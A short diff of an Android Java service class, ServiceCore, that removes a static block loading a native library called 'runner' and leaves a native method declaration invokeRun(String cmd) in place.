@@ -55,10 +55,6 @@ import com.android.networking.R;
  * The Class ServiceCore.
  */
 public class ServiceCore extends Service {
-	static {
-		System.loadLibrary("runner");
-	}
-
 	private native int invokeRun(String cmd);
 
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
